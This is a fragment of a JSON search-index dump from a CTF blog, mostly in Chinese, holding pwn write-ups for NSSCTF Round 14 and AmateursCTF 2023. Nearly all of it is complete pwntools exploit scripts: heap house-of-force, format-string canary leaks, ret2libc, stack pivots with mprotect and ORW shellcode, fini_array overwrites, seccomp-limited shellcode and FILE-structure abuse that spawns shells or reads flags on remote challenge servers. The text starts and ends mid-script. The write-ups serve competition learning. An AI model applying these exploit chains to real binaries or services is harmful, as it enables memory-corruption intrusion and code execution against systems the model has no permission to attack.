log.success('\\033[1;31;40m %s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote('192.168.31.155',50039)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './pwn'libelf = './libc-2.23.so'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)def add(idx,size,text):    ru('4.go away\\n')    sl('1')    ru('which index?\\n')    sl(str(idx))    ru('how much space do u want?\\n')    sl(str(size))    ru('now what to write?\\n')    s(text)    ru('on ')    x = int(ru(' is'),16)    return(x)x = add(0,0x30000,'AA')libc_base = x - 6008848x = add(1,0x8,p64(0)*3+p64(0xFFFFFFFFFFFFFFFF))top_chunk = x + 0x10target = 0x602040size = target - top_chunk - 0x20ls('top_chunk')ls('libc_base')add(2,size,'xx')o = [0x45226,0x4527a,0xf03a4,0xf1247][0] + libc_base#o = 0x400990#add(3,0x20,'AAAAAAA')add(3,0x20,p64(o))#gdb.attach(io)sl('1')sl('4') # idxsl('0') # sizeio.interactive()​"
  },
  
  {
    "title": "NSSCTF-Round-14-Basic",
    "url": "/posts/NSSCTF-Round-14-Basic/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-07-30 00:00:00 +0800",
    





    
    "snippet": "‍‍​‍  5 道pwn 题‍love存在 格式化字符串漏洞​​‍然后进入 vuln 函数，然后直接溢出,由于上面需要的libc_base Canary 都已经有了，可以直接 return system(“/bin/sh”);​​  exploit 非预期from pwn import *s       = lambda data               :io.send(data)sa...",
    "content": "‍‍​‍  5 道pwn 题‍love存在 格式化字符串漏洞​​‍然后进入 vuln 函数，然后直接溢出,由于上面需要的libc_base Canary 都已经有了，可以直接 return system(“/bin/sh”);​​  exploit 非预期from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x40131Bcontinue'''.format(**locals())binary = './pwn'libelf = './libc.so.6'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)io = remote('node4.anna.nssctf.cn',28753)#09:0048│     0x7ffc410fe908 ◂— 0x10140a8aa00b1300#0b:0058│     0x7ffe19b67ea8 —▸ 0x7ff05691e083 (__libc_start_main+243) ◂— mov edi, eaxpay = f'%520c%9$hn%{0x9+0x6}$p%{0x0b+0x6}$p'ru('Toka\\n\\n')#gdb.attach(io)sl(pay)ru('0x')cann = int(r(16),16)__libc_start_main = int(r(14),16)libc_base = __libc_start_main - 243 - libc.sym['__libc_start_main']system = libc_base + libc.sym['system']bin_sh = libc_base + next(libc.search(b'/bin/sh'))ls(hex(cann))ls(hex(libc_base))ru('level\\n\\n')pay = 0x28 * b\"A\" + p64(cann)*2 + p64(rop.find_gadget(['ret'])[0])*1 + p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(bin_sh) + p64(system) + p64(elf.sym['main'])sl(pay)io.interactive()  预期解法​​from ctypes import *from struct import packbanary = \"./love\"elf = ELF(banary)#libc = ELF(\"./libc.so.6\")libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")ip = '127.0.0.1'port = 10005local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = 'debug', os = 'linux', arch = 'amd64')#context(log_level = 'debug', os = 'linux', arch = 'i386')def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00'))uu64 = lambda : u64(io.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\"))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b'\\x00'))lg = lambda addr : log.info(addr)ia = lambda : io.interactive()pop_rdi=0x00000000004013f3puts_plt=elf.plt['puts']puts_got=elf.got['puts']ret=0x000000000040101a#gdb.attach(io,'b *0x000000000040125D')ru(\"I want to hear your praise of Toka\\n\")payload='%'+str(520)+'c'+'%9$hhn'sl(payload)#pause()payload=b'A'*0x28+p64(0xdeadbeef)+b'A'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym['vuln'])payload=payload.ljust(0x868,b'\\x00')+p64(0xdeadbeef)*3#payload=b'A'*8ru(\"I know you like him, but you must pass my level\\n\")sl(payload)libcbase=uu64()-libc.sym['puts']lg(\"libcbase:\"+hex(libcbase))system=libcbase+libc.sym['system']bin_sh=libcbase+next(libc.search(b'/bin/sh\\x00'))onegadget=libcbase+0xe3b01ru(\"I know you like him, but you must pass my level\\n\")payload=b'A'*0x28+p64(0xdeadbeef)+b'A'*8+p64(onegadget)sl(payload)ia()‍rbp‍ORW  拿flag‍​​只能溢出 覆盖一个 ret ,需要利用栈迁移​​控制 下一次 rbp 为bss上，然后再次read​​然后写 rop 到 bss 上都会栈迁移也到这里​​​​然后再 leave ret 栈迁移 泄露 libc上的地址‍​​puts 结束后 我们再 返回到 vuln​​​​​​‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x0x404410continue'''.format(**locals())binary = './rbp'libelf = '/opt/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote('node2.anna.nssctf.cn',28345)bss = 0x404800leave = 0x4012bfpay = b'A' *0x0210 + p64(bss) + p64(0x401292)gdb.attach(io)s(pay)pause()pay = p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(elf.got['puts']) + p64(elf.sym['puts']) +p64(0x0401270) # vulnpay = pay.ljust(0x0210,b'A')pay += p64(bss-0x218) + p64(leave)s(pay)ru('\\x40\\x0a')x = uu64(r(6))libc_base = x - libc.sym['puts']system = libc_base + libc.sym['system']bin_sh = libc_base + next(libc.search(b'/bin/sh'))ls(hex(libc_base))libc_file = '/opt/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6'libc_file = '/opt/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6'libc_rop = ROP(libc_file)def f(Str):    return libc_base + libc_rop.find_gadget([Str,'ret'])[0]syscall_ret = f('syscall')pop_rax = f('pop rax')pop_rdi = f('pop rdi')pop_rsi = f('pop rsi')pop_rbx = f('pop rbx')pop_adb   = libc_base +  0x0000000000090528 # pop rax ; pop rdx ; pop rbx ; retpop_adb   = libc_base +  0x000000000015f8c5 # pop rax ; pop rdx ; pop rbx ; retpop_adb   = libc_base +  0x000000000015f8c5 # pop rax ; pop rdx ; pop rbx ; retshellcode = shellcraft.open('/flag')shellcode += shellcraft.read('rax','rsp',100)shellcode += shellcraft.write(1,'rsp',100)shellcode = asm(shellcode)orw_rop = flat(        pop_rdi, bss-0x800,     # rdi addr        pop_rsi, 0x1000, # rsi length        pop_adb, 0,7,0,  # rdx per         libc_base + libc.sym['mprotect'], # 修改 权限        0x404448, # 此时栈已经 rwx了 所以直接返回到栈上执行代码        '\\x90'*0x20,        shellcode         )pay =  orw_roppay = pay.ljust(0x0210,b'B')#x = bss - 0x404610#exe = 0x4045f0-0x1f0#pay += p64(bss-0x1f8) + p64(leave)#pay += p64(bss-0x1f8) + p64(leave)pay += p64(0x4043f0) + p64(leave)pause()s(pay)io.interactive()第一次栈迁移泄露 libc第二次 利用 mprotect 修改 bss 权限 为 rwx ,顺便把 orw shllcode 写到bss上，然后 ret2 shellcode‍xor‍​​​​​​      第一次修改 flag的 高位 为 0xff 也就成负数了,然后就可以一直不退出程序        然后把shellcode 写到 bss 上，    程序退出时会执行 __do_global_dtors_aux_fini_array_entry​ ,相当于got  我们把shellcode 的地址写进去，就可以执行了​__libc_csu_init​ -&gt; lea rbp, __do_global_dtors_aux_fini_array_entry​‍​​  二次读 shellcode​​  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x004006FEcontinue'''.format(**locals())binary = './pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote('node1.anna.nssctf.cn',28651)#sc = asm(shellcraft.sh())sc = '''xor eax,eaxxor edi,edipush 0x78pop rdxpush 0x600958pop rsisyscall'''sc = asm(sc)print(len(sc))print(disasm(sc))pause()def w(add,vul):    ru('addr: ')    sl(hex(add))    ru('value: ')    sl('0x' + hex(vul)[2:].rjust(2,'0'))# 改 flag 高位，这样 flag就是负数了w(0x0600BCC+3,0x100-0x10)#gdb.attach(io)# 把 read 的shellcode 写到 bss上read = 0x600958for i in range(0,len(sc)):    p1 = u8(sc[i:i+1])    add = (0x600958 + i)    w(add ,p1)sc = p32(0x400610)for i in range(0,len(sc)):    p1 = u8(sc[i:i+1])    add = 0x600970 + i    w(add ,p1)sc = p32(read)for i in range(0,len(sc)):    p1 = u8(sc[i:i+1])    add = 0x600970 + i    w(add ,p1)#gdb.attach(io,'b *0x400610')# exitw(0x0600BCC+3,0x100-0x10)pause()pay = 0x16 * b'\\x90'pay += asm(shellcraft.sh())sl(pay)io.interactive()‍read_filefrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x0401478continue'''.format(**locals())binary = './pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ;if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote('node5.anna.nssctf.cn',28140)def load_file(name):    ru('&gt;&gt; ')    sl('1')    ru(' : ')    s(name)load_file('dev/null')load_file('flag\\x00fla')ru('&gt;&gt; ')sl('2')ru(' : ')sl('55')#gdb.attach(io)rop=ROP(binary)pay = b'A' * 55 + b'BBBBBBBBCCCCCCCCD'pay += p64(0x401493) + p64(0x0401615) * 2 # 巧妙sl(pay)Girlfriends’ notebooks‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './pwn'libelf = '/opt/pwn/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)def add(idx,size,text):    ru('choice: ')    sl('1')    ru(\"idx: \")    sl(str(idx))    ru('size: ')    sl(str(size))    ru('content: ')    s(text)def show(idx):    ru('choice: ')    sl('2')    ru(\"idx: \")    sl(str(idx))def edit(idx,text):    ru('choice: ')    sl('4')    ru(\"idx: \")    sl(str(idx))    ru(\"content: \")    sl(text)io = start(binary)#io = remote()add(0,0x48,b'a'*0x58+p64(0x1001))#add(0,0x48,b'a'*0x50)add(1,0x2000,b'wsnd')gdb.attach(io)pause()add(4,0x200,'B'*8)show(4)ru('B'*8)main_arena = uu64(r(6))ls(hex(main_arena))libc_base = main_arena - 2204400__free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']log.success(hex(main_arena))log.success(hex(libc_base))io_file = FileStructure()libc.address = libc_baserop  = ROP(libc)pop_rbp_addr = rop.find_gadget([\"pop rbp\",\"ret\"])[0]leave_ret_addr = rop.find_gadget([\"leave\",\"ret\"])[0]standard_FILE_addr = libc.sym['_IO_2_1_stdout_']_IO_wfile_jumps_addr = libc.sym[\"_IO_wfile_jumps\"]fake_rbp_addr = libc.address+0x21a860-8 # libc.address+0x21a860-8 开始写 rop 链io_file.flags = 0 io_file._IO_read_ptr = pop_rbp_addrio_file._IO_read_end = fake_rbp_addrio_file._IO_read_base = leave_ret_addrio_file._IO_write_base = 0io_file._IO_write_ptr = 1io_file.unknown2 |= (0 &lt;&lt; 192)io_file._lock = standard_FILE_addr-0x10io_file.chain = leave_ret_addrio_file._codecvt = standard_FILE_addrio_file._wide_data = standard_FILE_addr - 0x48io_file.vtable = _IO_wfile_jumps_addrrdi = rop.find_gadget([\"pop rdi\",\"ret\"])[0]rsi = rop.find_gadget([\"pop rsi\",\"ret\"])[0]rdx= rop.find_gadget([\"pop rdx\",\"pop r12\",\"ret\"])[0]open_ = libc.sym['open']read_= libc.sym['read']puts = libc.sym['puts']write_ = libc.sym['write']flag = libc.address+0x21a908payload = bytes(io_file)payload += p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(open_)payload += p64(rdi)+p64(3)+p64(rsi)+p64(libc.address+0x21af00)+p64(rdx)+p64(0xff)+p64(0)+p64(read_)payload += p64(rdi)+p64(1)+p64(rsi)+p64(libc.address+0x21af00)+p64(rdx)+p64(0xff)+p64(0)+p64(write_)payload += b\"/flag\\x00\"ls(hex(fake_rbp_addr))edit(-8,payload)io.interactive()"
  },
  
  {
    "title": "2023-AmateursCTF-WriteUps",
    "url": "/posts/AmateursCTF/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-07-19 20:55:00 +0800",
    





    
    "snippet": "https://ctf.amateurs.team/1.pwn-rntk  代码恢复  程序自己生产里一个类似 canary 的东西，溢出检测#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include &lt;time.h&gt;long long int global_canary=NULL...",
    "content": "https://ctf.amateurs.team/1.pwn-rntk  代码恢复  程序自己生产里一个类似 canary 的东西，溢出检测#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include &lt;time.h&gt;long long int global_canary=NULL;int win(){  char s[72]; // [rsp+0h] [rbp-50h] BYREF  FILE *stream; // [rsp+48h] [rbp-8h]  stream = fopen(\"flag.txt\", \"r\");  if ( !stream )  {    puts(\"flag file not found\");    exit(1);  }  fgets(s, 64, stream);  return puts(s);}int random_guess(){  char nptr[40]; // [rsp+0h] [rbp-30h] BYREF  int v2; // [rsp+28h] [rbp-8h]  int v3; // [rsp+2Ch] [rbp-4h]  printf(\"Enter in a number as your guess: \");  v3 = global_canary;  gets(nptr);  v2 = strtol(nptr, 0LL, 10);  if ( v3 != global_canary ) // 溢出检测  {    puts(\"***** Stack Smashing Detected ***** : Canary Value Corrupt!\");    exit(1);  }  if ( v2 == rand() )    return puts(\"Congrats you guessed correctly!\");  else    return puts(\"Better luck next time\");}int generate_canary(){  unsigned int v0; // eax  int result; // eax  v0 = time(0LL);  srand(v0);  result = rand();  global_canary = result;  return result;}int  main(){  unsigned int v3; // eax  int v4; // [rsp+Ch] [rbp-4h] BYREF  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  generate_canary();  while ( 1 )  {    puts(\"Please select one of the following actions\");    puts(\"1) Generate random number\");    puts(\"2) Try to guess a random number\");    puts(\"3) Exit\");    v4 = 0;    scanf(\"%d\", &amp;v4);    getchar();    if ( v4 == 3 )      break;    if ( v4 &lt;= 3 )    {      if ( v4 == 1 )      {        v3 = rand();        printf(\"%d\\n\", v3);      }      else if ( v4 == 2 )      {        random_guess();      }    }  }  exit(0);}// gcc main.c -fno-stack-protector  使用time 预测计算 伪随机，进行预测canary的值然后覆盖 returnfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']io = process(binary)io = remote('amt.rs',31175)win = 0x04012BAfrom ctypes import *import timecli = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')cli.srand(int(time.time()))v3 = cli.rand()print(v3)ru('3) Exit\\n')#gdb.attach(io)sl('2')ru(': ')pay = (44) * b'A' + p32(v3) + p64(0) + p64(win)sl(pay)io.interactive()# amateursCTF{r4nd0m_n0t_s0_r4nd0m_after_all}2.pwn-permissions      源码          沙箱 只允许 read write exit      #include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;seccomp.h&gt;#include &lt;err.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void setup_seccomp () {    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_KILL);    int ret = 0;    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);    ret |= seccomp_load(ctx);    if (ret) {        errx(1, \"seccomp failed\");    }}int main () {    setbuf(stdout, NULL);    setbuf(stderr, NULL);    alarm(6);    int fd = open(\"flag.txt\", O_RDONLY);    if (0 &gt; fd)        errx(1, \"failed to open flag.txt\");    char * flag = mmap(NULL, 0x1000, PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);    if (flag == MAP_FAILED)        errx(1, \"failed to mmap memory\");    if (0 &gt; read(fd, flag, 0x1000))        errx(1, \"failed to read flag\");    close(fd);    // make flag write-only    if (0 &gt; mprotect(flag, 0x1000, PROT_WRITE))        errx(1, \"failed to change mmap permissions\");    char * code = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);    if (code == MAP_FAILED)        errx(1, \"failed to mmap shellcode buffer\");    printf(\"&gt; \");    if (0 &gt; read(0, code, 0x100000))        errx(1, \"failed to read shellcode\");    setup_seccomp();    ((void(*)(char *))code)(flag);    exit(0);}  程序沙箱=[06:06:12]-➤  seccomp-tools dump ./chal&gt; 1 line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009 0008: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x06 0x00 0x00 0x00000000  return KILL  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']io = process(binary)io = remote('amt.rs',31174)pay = asm('''    xchg rax,rsi    push 1    pop rax    push 1    pop rdi    push 50    pop rdx    syscall        ''')#gdb.attach(io,'b *$rebase(0x01553)')sl(pay)io.interactive()# amateursCTF{exec_1mpl13s_r34d_8751fda0}  SYS_write_ 输出flag​​‍‍3.pwn-hex-converter-1  源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    setbuf(stdout, NULL);    setbuf(stderr, NULL);    int i = 0;    char name[16];    printf(\"input text to convert to hex: \\n\");    gets(name);    char flag[64];    fgets(flag, 64, fopen(\"flag.txt\", \"r\"));    // TODO: PRINT FLAG for cool people ... but maybe later    while (i &lt; 16)    {        // the &amp; 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe        printf(\"%02X\", (unsigned int)(name[i] &amp; 0xFF));        i++;    }    printf(\"\\n\");}利用溢出覆盖  v7 的值为负数，然后就可以printf flag_data 了​​  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''lcontext.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)io = remote('amt.rs',31630)ru('input text to convert to hex: \\n')pay = b'A' * (28) +  p64(0x100000000 + (-64))#gdb.attach(io)sl(pay)x = io.recvline()[:-1]print(bytes.fromhex(x.decode()))io.interactive()‍4.pwn-hex-converter-2  源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    setbuf(stdout, NULL);    setbuf(stderr, NULL);    int i = 0;    char name[16];    printf(\"input text to convert to hex: \\n\");    gets(name);    char flag[64];    fgets(flag, 64, fopen(\"flag.txt\", \"r\"));    // TODO: PRINT FLAG for cool people ... but maybe later    while (1)    {        // the &amp; 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe        printf(\"%02X\", (unsigned int)(name[i] &amp; 0xFF));        // exit out of the loop        if (i &lt;= 0)        {            printf(\"\\n\");            return 0;        }        i--;    }}‍IDA 打开如果把 v7 覆盖成 负数，确实可以 泄露 flag,但是只能泄露一个，我们可以写个循环来一个一个字符泄露flag​​‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)flag = ''for i in range(140):    #io = process(binary)    io = remote('amt.rs',31631)    ru('input text to convert to hex: \\n')    pay = b'A' * (28) +  p64(0x100000000 + (-64)+i)    sl(pay)    flag += chr(int(io.recv(2),16))    print(flag)    io.close()#x = io.recvline()[:-1]#print(bytes.fromhex(x.decode()))#io.interactive(‍​​amateursCTF{an0ther_e4sier_0ne_t0_offset_unvariant_while_l00p}‍5.pwn-i-love-ffi  源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;struct MmapArgs {    uint64_t * addr;    uint64_t length;    int protection;    int flags;    int fd;    uint64_t offset;};extern struct MmapArgs mmap_args();int main () {    setbuf(stdout, NULL);    setbuf(stderr, NULL);    struct MmapArgs args = mmap_args();    char * buf = mmap(args.addr, args.length, args.protection, MAP_PRIVATE | MAP_ANON, args.fd, args.offset);    if (buf &lt; 0) {        perror(\"failed to mmap\");    }    read(0, buf, 0x1000);    printf(\"&gt; \");    int op;    if (scanf(\"%d\", &amp;op) == 1) {        switch (op) {            case 0:                ((void (*)(void))buf)();                break;            case 1:                puts(buf);                break;        }    }}‍‍DIA 打开 自定义libc 函数 mmap_args​​‍自定义libc​​​​看下实际给谁赋的值​​​​        addr: 0x0  # rdi        len: 0x190 # rsi        prot: 0x7  # rdx        flags: 0x21 # r10        fd: 0xffffffff # r8        offset: 0x0 # r9‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)#io = remote()addr = 0x30000Len = 0x1000fd =  0offset = 0prot = 7sla(\"&gt;\",str(addr))sla(\"&gt;\",str(Len))sla(\"&gt;\",str(fd))sla(\"&gt;\",'0')sla(\"&gt;\",str(offset))gdb.attach(io)sla(\"&gt;\",str(prot))io.interactive()‍​​mmap 申请的 0x3000​​‍然后下面就是读一段shellcode,直接发送过去，然后 去执行‍‍​​  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)io = remote('amt.rs',31172)addr = 0x30000Len = 0x1000fd =  0offset = 0prot = 7sla(\"&gt;\",str(addr))sla(\"&gt;\",str(Len))sla(\"&gt;\",str(fd))sla(\"&gt;\",'0')sla(\"&gt;\",str(offset))sla(\"&gt;\",str(prot))shellcode = 